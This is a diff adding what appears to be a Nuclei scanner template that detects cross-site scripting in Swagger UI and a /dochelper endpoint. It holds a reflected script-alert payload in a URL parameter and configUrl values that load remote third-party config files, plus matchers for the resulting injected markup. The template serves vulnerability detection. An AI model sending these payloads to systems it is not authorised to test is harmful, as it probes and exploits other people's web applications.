@@ -1,0 +1,31 @@
+id: swagger-xss
+
+info:
+  name: Swagger API XSS
+  author: geeknik
+  severity: medium
+  reference: https://twitter.com/A0x017/status/1371122293921964032
+  tags: swagger,xss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dochelper?userId=<script>alert(11)</script>"
+      - "{{BaseURL}}/swagger/index.html??configUrl=https://jumpy-floor.surge.sh/test.json"
+      - "{{BaseURL}}/swagger/index.html?configUrl=https://m0x0101.github.io/lol/test.yaml"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: word
+        part: body
+        words:
+          - "<script>alert(11)</script>"
+          - "<img onerror=\"alert('textarea')\" src=\"1\">"
+          - "XSS Attack BY M0X0101"
+      - type: status
+        status:
+          - 200
